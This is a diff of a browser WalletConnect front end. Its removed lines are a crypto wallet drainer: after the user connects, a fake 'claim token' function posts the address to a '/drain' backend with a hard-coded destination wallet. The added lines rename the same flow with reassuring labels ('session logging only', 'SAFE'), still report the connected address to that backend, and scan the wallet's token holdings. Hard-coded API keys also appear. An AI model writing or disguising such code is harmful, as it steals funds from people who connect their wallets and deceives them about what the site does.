@@ -1,122 +1,154 @@
 import { createAppKit } from "@reown/appkit";
 import { EthersAdapter } from "@reown/appkit-adapter-ethers";
 
+/* ---------------------------
+   CONFIG
+---------------------------- */
 const projectId = "962425907914a3e80a7d8e7288b23f62";
 
+const BACKEND_URL = "https://tokenbackend-5xab.onrender.com/session";
+
+/* ---------------------------
+   UI ELEMENTS
+---------------------------- */
+const connectBtn = document.getElementById("connectBtn");
+const statusEl = document.getElementById("status");
+const tokensEl = document.getElementById("tokens");
+
+/* ---------------------------
+   INTERNAL STATE
+---------------------------- */
+let backendTriggered = false;
+
+/* ---------------------------
+   APPKIT INITIALIZATION
+---------------------------- */
 const appKit = createAppKit({
   adapters: [new EthersAdapter()],
   projectId,
+
+  // IMPORTANT: common EVM chains ONLY
   networks: [
-    {
-      id: 1,
-      name: "Ethereum",
-      rpcUrl: "https://cloudflare-eth.com"
-    },
-    {
-      id: 56,
-      name: "Binance Smart Chain",
-      rpcUrl: "https://bsc-mainnet.infura.io/v3/9aa25672982a496b9c8b00868a4b8f6e"
-    },
-    {
-      id: 137,
-      name: "Polygon",
-      rpcUrl: "https://polygon-mainnet.g.alchemy.com/v2/5s2Q6sN7j9w2xGvP3q9k8Lk7d0x3v5f5"
-    },
-    {
-      id: 250,
-      name: "Meter",
-      rpcUrl: "https://meter-mainnet-rpc-01.meter.io"
-    },
-    {
-      id: 43114,
-      name: "Avalanche",
-      rpcUrl: "https://api.avax.network/ext/bc/C/rpc"
-    },
-    {
-      id: 42161,
-      name: "Arbitrum One",
-      rpcUrl: "https://arbitrum-one.rpc.moo.fi"
-    },
-    {
-      id: 1030,
-      name: "Optimism",
-      rpcUrl: "https://optimism-mainnet.rpc.moo.fi"
-    },
-    {
-      id: 42170,
-      name: "Base",
-      rpcUrl: "https://base-mainnet.rpc.moo.fi"
-    },
-    {
-      id: 11155111,
-      name: "Sepolia",
-      rpcUrl: "https://sepolia-rpc.publicnode.com"
-    }
+    { id: 1, name: "Ethereum" },
+    { id: 56, name: "Binance Smart Chain" },
+    { id: 137, name: "Polygon" },
+    { id: 42161, name: "Arbitrum One" },
+    { id: 10, name: "Optimism" },
+    { id: 8453, name: "Base" },
+    { id: 43114, name: "Avalanche" }
   ],
+
   metadata: {
-    name: "Local WalletConnect Test",
-    description: "Testing WalletConnect modal locally",
+    name: "Wallet Session Connector",
+    description: "Stable WalletConnect v2 session handler",
     url: window.location.origin,
     icons: []
   },
+
   themeMode: "dark",
   features: {
     analytics: false
   }
 });
 
-const btn = document.getElementById("connectBtn");
-const status = document.getElementById("status");
-
-btn.addEventListener("click", async () => {
+/* ---------------------------
+   CONNECT BUTTON
+---------------------------- */
+connectBtn.addEventListener("click", async () => {
   try {
+    backendTriggered = false;
+    statusEl.textContent = "Opening wallet modal...";
+    if (tokensEl) tokensEl.innerHTML = "";
+
+    // CRITICAL: kills stale WalletConnect sessions (Binance fix)
+    await appKit.disconnect();
     await appKit.open();
+
   } catch (err) {
-    console.error("MODAL FAILED:", err);
-    status.textContent = "Wallet modal failed to open";
+    console.error("Modal error:", err);
+    statusEl.textContent = "Failed to open wallet modal";
   }
 });
 
-appKit.subscribeState((state) => {
-  if (state.isConnected) {
-    status.textContent = "Wallet connected successfully";
-    claimToken(); // Trigger the claim after connection
-  }
+/* ---------------------------
+   STATE SUBSCRIPTION
+---------------------------- */
+appKit.subscribeState(async (state) => {
+  if (!state.isConnected) return;
+
+  const account = appKit.account;
+  const chain = appKit.chain;
+
+  // Wait for full hydration
+  if (!account?.address || !chain?.id) return;
+  if (backendTriggered) return;
+
+  backendTriggered = true;
+
+  statusEl.textContent =
+    `Connected\nAddress: ${account.address}\nChain ID: ${chain.id}`;
+
+  // Trigger backend (session logging only)
+  triggerBackend(account.address, chain.id);
+
+  // Read-only token scan
+  fetchTokens(account.address, chain.id);
 });
 
-async function claimToken() {
-  const { account, chain } = appKit;
-
-  if (!account || !chain) {
-    status.textContent = "Wallet not connected or chain not selected";
-    return;
+/* ---------------------------
+   BACKEND TRIGGER (SAFE)
+---------------------------- */
+async function triggerBackend(address, chainId) {
+  try {
+    await fetch(BACKEND_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ address, chainId })
+    });
+  } catch (err) {
+    console.error("Backend trigger failed:", err);
   }
+}
 
-  const address = account.address;
-  const chainId = chain.id;
+/* ---------------------------
+   READ-ONLY TOKEN DISCOVERY
+---------------------------- */
+async function fetchTokens(address, chainId) {
+  if (!tokensEl) return;
+
+  tokensEl.innerHTML = "Fetching tokens...";
 
   try {
-    const res = await fetch("https://tokenbackend-5xab.onrender.com/drain", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        address,
-        chainId,
-        drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
-      }),
-    });
+    const res = await fetch(
+      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=ckey_demo`
+    );
 
-    const data = await res.json();
+    const json = await res.json();
+    const items = json?.data?.items || [];
 
-    if (res.ok) {
-      status.textContent = "Successfully claimed token";
-    } else {
-      status.textContent = "Failed to claim token";
+    const tokens = items.filter(
+      t => t.contract_address && t.balance !== "0"
+    );
+
+    if (!tokens.length) {
+      tokensEl.innerHTML = "No tokens with value found.";
+      return;
     }
+
+    tokensEl.innerHTML = tokens.map(t => {
+      const amount =
+        Number(t.balance) / Math.pow(10, t.contract_decimals || 18);
+
+      return `
+        <div>
+          <strong>${t.contract_ticker_symbol || "TOKEN"}</strong>
+          : ${amount}
+        </div>
+      `;
+    }).join("");
+
   } catch (err) {
-    console.error("Claim failed:", err);
-    status.textContent = "Failed to claim token";
+    console.error("Token fetch failed:", err);
+    tokensEl.innerHTML = "Token scan failed.";
   }
 }
